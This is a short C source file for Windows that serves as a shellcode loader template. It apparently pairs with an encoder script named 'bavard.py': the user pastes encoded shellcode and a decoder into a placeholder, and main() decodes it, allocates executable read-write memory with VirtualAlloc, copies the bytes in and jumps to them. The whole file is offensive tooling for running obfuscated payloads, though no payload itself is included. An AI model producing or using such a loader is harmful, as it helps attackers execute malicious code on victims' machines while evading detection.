#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// === Clean and paste here the C output provided by bavard.py ===

// (encoded_shellcode[], decode_table[], decode_shellcode())

// ======================================================

int get_shellcode_length() {
    return sizeof(encoded_shellcode) / sizeof(char*);
}

int main() {
    unsigned char* shellcode = decode_shellcode();
    int len = get_shellcode_length();

    void* exec = VirtualAlloc(
        NULL,
        len,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!exec) {
        printf("[-] VirtualAlloc failed\n");
        return 1;
    }

    memcpy(exec, shellcode, len);
    printf("[+] Executing shellcode (%d bytes)...\n", len);

    ((void(*)())exec)();

    return 0;
}
    
